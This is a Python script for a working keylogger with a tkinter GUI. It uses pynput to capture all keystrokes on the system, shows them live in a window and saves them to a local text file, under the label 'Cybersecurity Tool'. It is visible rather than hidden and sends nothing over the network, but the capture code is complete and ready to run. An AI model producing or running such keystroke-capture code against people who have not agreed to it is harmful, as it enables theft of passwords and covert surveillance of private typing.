from pynput import keyboard
import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading
import time

log = ""
listener = None
logging_active = False

# Log file name
log_file = "key_log.txt"

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f"[{key.name}]"
    update_textbox()

def start_logging():
    global listener, logging_active
    if not logging_active:
        logging_active = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Status: Logging...", fg="green")
    else:
        messagebox.showinfo("Already Running", "Keylogger is already active!")

def stop_logging():
    global listener, logging_active
    if listener:
        listener.stop()
        listener = None
    logging_active = False
    status_label.config(text="Status: Stopped", fg="red")

def update_textbox():
    text_area.delete("1.0", tk.END)
    text_area.insert(tk.END, log)

def save_log():
    with open(log_file, "w", encoding='utf-8') as f:
        f.write(log)
    messagebox.showinfo("Saved", f"Keystrokes saved to {log_file}")

def animate_title():
    while True:
        for color in ["#0f0f0f", "#2c2f33", "#36393f", "#7289da"]:
            title_label.config(fg=color)
            time.sleep(0.6)

# GUI Setup
root = tk.Tk()
root.title("Keylogger - Cybersecurity Tool")
root.geometry("500x400")
root.configure(bg="#1e1e1e")

title_label = tk.Label(root, text="🔐 Keylogger Tool", font=("Segoe UI", 18, "bold"), bg="#1e1e1e", fg="white")
title_label.pack(pady=10)

status_label = tk.Label(root, text="Status: Idle", font=("Segoe UI", 12), bg="#1e1e1e", fg="orange")
status_label.pack()

text_area = scrolledtext.ScrolledText(root, width=60, height=15, font=("Consolas", 10), bg="#282c34", fg="white", insertbackground='white')
text_area.pack(pady=10)

button_frame = tk.Frame(root, bg="#1e1e1e")
button_frame.pack(pady=10)

start_btn = tk.Button(button_frame, text="▶ Start Logging", command=start_logging, bg="#4caf50", fg="white", width=15)
start_btn.grid(row=0, column=0, padx=5)

stop_btn = tk.Button(button_frame, text="⏹ Stop Logging", command=stop_logging, bg="#f44336", fg="white", width=15)
stop_btn.grid(row=0, column=1, padx=5)

save_btn = tk.Button(button_frame, text="💾 Save Log", command=save_log, bg="#2196f3", fg="white", width=15)
save_btn.grid(row=0, column=2, padx=5)

# Title animation thread
animation_thread = threading.Thread(target=animate_title, daemon=True)
animation_thread.start()

root.mainloop()
